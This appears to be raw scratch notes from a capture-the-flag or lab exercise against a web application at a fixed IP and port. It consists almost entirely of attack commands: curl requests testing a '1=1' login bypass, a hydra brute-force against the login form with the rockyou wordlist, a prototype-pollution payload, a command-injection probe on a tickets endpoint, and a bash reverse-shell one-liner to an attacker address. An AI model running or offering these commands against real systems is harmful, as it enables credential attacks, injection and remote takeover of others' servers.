curl -i -s -k -X $'POST' \
    -H $'Host: 138.68.150.120:31225' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: http://138.68.150.120:31225/login' -H $'Content-Type: application/json' -H $'Origin: http://138.68.150.120:31225' -H $'Content-Length: 40' -H $'Connection: close' \
    --data-binary $'{\"username\":\" Ulysses\",\"password\":\"1=1\"}' \
    $'http://138.68.150.120:31225/api/login'
	
	hydra -l Ulysses -P /usr/share/wordlists/rockyou.txt 138.68.150.120 -s 31225 http-post-form "/api/login:{"username"=^USER^,"password"=^PASS^}:Invalid username or password!"
	
	
	curl -H "Content-Type: application/jason" -X POST http://138.68.150.120:31225/api/login -d '{"message":"ping", "__proto__":{"flag":true}}'

curl -i -s -k -X $'POST' \
    -H $'Host: 138.68.150.120:31225' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: http://138.68.150.120:31225/' -H $'Content-Type: application/json' -H $'Origin: http://138.68.150.120:31225' -H $'Content-Length: 16' -H $'Connection: close' \
    --data-binary $'{\"message\":\"id\"}' \
    $'http://138.68.150.120:31225/api/tickets/add'
	
	- [ ] 10.10.14.26
	
	echo -n ‘bash -i >& /dev/tcp/10.10.14.26/1234 0>&1’ 